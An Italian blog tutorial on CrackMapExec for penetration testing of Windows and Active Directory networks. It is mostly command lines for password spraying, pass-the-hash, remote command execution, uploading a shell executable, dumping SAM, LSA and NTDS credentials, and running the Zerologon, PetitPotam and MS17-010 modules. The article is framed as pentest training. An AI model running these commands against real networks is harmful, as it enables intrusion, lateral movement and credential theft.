---
title: 'CrackMapExec (CME): Lo Strumento Definitivo per il Penetration Testing'
slug: crackmapexec
description: 'CrackMapExec è uno strumento potente e versatile utilizzato da ethical hacker e professionisti della cybersecurity per il penetration testing su reti Windows. In questo articolo scoprirai come funziona, come usarlo in scenari reali, e perché è fondamentale per attività di post-exploitation, enumerazione e movimento laterale in ambienti Active Directory.'
image: /Gemini_Generated_Image_9aprd09aprd09apr.webp
draft: false
date: 2026-01-30T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - cme
  - crackmapexec
---

# CrackMapExec (CME): Lo Strumento Definitivo per il Penetration Testing

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2AeAjPITa1AT3c5DtDhTZ65A.png)

CrackMapExec (**CME**) è un framework di enumerazione e post-exploitation usato nei penetration test su reti Windows e domini Active Directory.

È progettato per:

* Testare credenziali su più host simultaneamente
* Identificare privilegi amministrativi locali
* Enumerare utenti, gruppi e share
* Automatizzare lateral movement
* Estrarre informazioni sensibili da sistemi compromessi

Lavora principalmente su SMB, ma supporta anche WinRM, LDAP, MSSQL, RDP e SSH.

***

# Installazione CrackMapExec

## Metodo consigliato (isolamento dipendenze)

```bash
python3 -m pip install pipx
pipx ensurepath
pipx install crackmapexec
```

Verifica installazione:

```bash
crackmapexec --help
```

***

# Sintassi base

```bash
crackmapexec <protocollo> <target> -u <utente> -p <password>
```

Esempio reale:

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123
```

***

# Enumerazione iniziale rete Windows

## Identificare host Windows e dominio

```bash
crackmapexec smb 10.10.10.0/24
```

Output rilevante:

* Sistema operativo
* Nome dominio
* SMB signing
* Versione protocollo

Serve per capire se siamo in dominio e se è possibile effettuare relay.

***

# Validazione credenziali

```bash
crackmapexec smb 10.10.10.0/24 -u john -p Password123
```

Interpretazione output:

* `SUCCESS` → credenziali valide
* `FAIL` → login fallito
* `(Pwn3d!)` → privilegi amministrativi locali

***

# Password Spraying

Test password contro lista utenti:

```bash
crackmapexec smb 10.10.10.0/24 -u users.txt -p Summer2024
```

Test lista password su singolo utente:

```bash
crackmapexec smb 10.10.10.0/24 -u administrator -p passwords.txt
```

Opzione per continuare dopo successo:

```bash
crackmapexec smb 10.10.10.0/24 -u users.txt -p Password123 --continue-on-success
```

***

# Autenticazione avanzata

## Null session

```bash
crackmapexec smb 10.10.10.10 --null-session
```

## Pass-the-Hash

```bash
crackmapexec smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```

## Kerberos (ticket)

```bash
crackmapexec smb 10.10.10.10 -u john --kerberos
```

***

# SMB Enumeration

## Share disponibili

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --shares
```

## Utenti dominio

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --users
```

## Gruppi dominio

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --groups
```

## Computer nel dominio

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --computers
```

**🚀 Aggiornamento Tool Offensive**\
Hai visto che CrackMapExec è ormai vecchio e non più mantenuto? Passa a **NetExec (NXC)** — il fork moderno, attivo e potenziato!

🔥 **Perché cambiare?**\
✅ Supporto continuo e aggiornamenti costanti\
✅ Nuove funzionalità e miglioramenti\
✅ Compatibilità con le ultime versioni di Python e Samba\
✅ Community attiva e documentazione completa

📖 **Leggi la guida dettagliata qui:**\
🔗 [https://hackita.it/articoli/netexec](https://hackita.it/articoli/netexec)

Installa subito con:

```bash
pipx install netexec
```

E sostituisci `crackmapexec` con `nxc` nei tuoi workflow! 💪

## Logged-on users

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --loggedon-users
```

## Password policy

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --pass-pol
```

***

# RID Brute

Enumerazione utenti via RID:

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --rid-brute
```

***

# LDAP Enumeration

## Utenti dominio

```bash
crackmapexec ldap 10.10.10.10 -u john -p Password123 --users
```

## Gruppi dominio

```bash
crackmapexec ldap 10.10.10.10 -u john -p Password123 --groups
```

## Admin count

```bash
crackmapexec ldap 10.10.10.10 -u john -p Password123 --admin-count
```

***

# RDP Enumeration

```bash
crackmapexec rdp 10.10.10.10 -u john -p Password123
```

Screenshot login (se consentito):

```bash
crackmapexec rdp 10.10.10.10 -u john -p Password123 --screenshot
```

***

# MSSQL Enumeration

## Query SQL

```bash
crackmapexec mssql 10.10.10.15 -u sa -p Password123 -q "SELECT name FROM master.dbo.sysdatabases"
```

## Esecuzione comando

```bash
crackmapexec mssql 10.10.10.15 -u sa -p Password123 -x whoami
```

***

# Command Execution

## SMB - CMD

```bash
crackmapexec smb 10.10.10.20 -u administrator -p Password123 -x whoami
```

## SMB - PowerShell

```bash
crackmapexec smb 10.10.10.20 -u administrator -p Password123 -X "Get-Process"
```

## WinRM - CMD

```bash
crackmapexec winrm 10.10.10.20 -u john -p Password123 -x whoami
```

## WinRM - PowerShell

```bash
crackmapexec winrm 10.10.10.20 -u john -p Password123 -X "ipconfig"
```

***

# File Operations

## Spider share

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --spider C$
```

## Download file

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --share C$ --get-file users.txt users.txt
```

## Upload file

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 --share C$ --put-file shell.exe shell.exe
```

***

# Dump credenziali

## Dump SAM

```bash
crackmapexec smb 10.10.10.20 -u administrator -p Password123 --sam
```

## Dump LSA

```bash
crackmapexec smb 10.10.10.20 -u administrator -p Password123 --lsa
```

## Dump NTDS (Domain Controller)

```bash
crackmapexec smb 10.10.10.10 -u administrator -p Password123 --ntds
```

***

# Vulnerability Modules

## Zerologon

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 -M Zerologon
```

## PetitPotam

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 -M PetitPotam
```

## MS17-010

```bash
crackmapexec smb 10.10.10.10 -u john -p Password123 -M ms17-010
```

***

# Output su file

```bash
crackmapexec smb 10.10.10.0/24 -u john -p Password123 --output output.csv
```

***

# Tabella Operativa

| Obiettivo            | Comando                  | Risultato         |
| -------------------- | ------------------------ | ----------------- |
| Scan rete            | `smb 10.10.10.0/24`      | Identifica host   |
| Validare credenziali | `-u john -p Password123` | Accesso valido    |
| Verificare admin     | `(Pwn3d!)`               | Pivot possibile   |
| Dump credenziali     | `--sam`                  | Hash locali       |
| Lateral movement     | `-x whoami`              | Esecuzione remota |

***

# Checklist Operativa Finale

* Identificare subnet
* Validare credenziale iniziale
* Spray controllato
* Identificare admin locali
* Enumerare dominio
* Eseguire comando remoto
* Dump credenziali
* Documentare evidenze

***

# FAQ SEO

### CrackMapExec è utile per Active Directory?

Sì, è uno dei tool più rapidi per validare accessi e individuare privilegi.

### È rumoroso?

Sì. Genera eventi di login 4624 e 4625.

### Supporta Pass-the-Hash?

Sì, tramite opzione `-H`.

### Supporta Kerberos?

Sì, tramite opzione `--kerberos`.

***

## HackITA — Supporta la Crescita della Formazione Offensiva

Se questo contenuto ti è stato utile e vuoi contribuire alla crescita di HackITA, puoi supportare direttamente il progetto qui:

👉 [https://hackita.it/supporta](https://hackita.it/supporta)

Il tuo supporto ci permette di sviluppare lab realistici, guide tecniche avanzate e scenari offensivi multi-step pensati per professionisti della sicurezza.

***

## Vuoi Testare la Tua Azienda o Portare le Tue Skill al Livello Successivo?

Se rappresenti un’azienda e vuoi valutare concretamente la resilienza della tua infrastruttura contro attacchi mirati, oppure sei un professionista/principiante che vuole migliorare con simulazioni reali:

👉 [https://hackita.it/servizi](https://hackita.it/servizi)

Red Team assessment su misura, simulazioni complete di kill chain e percorsi formativi avanzati progettati per ambienti enterprise reali.
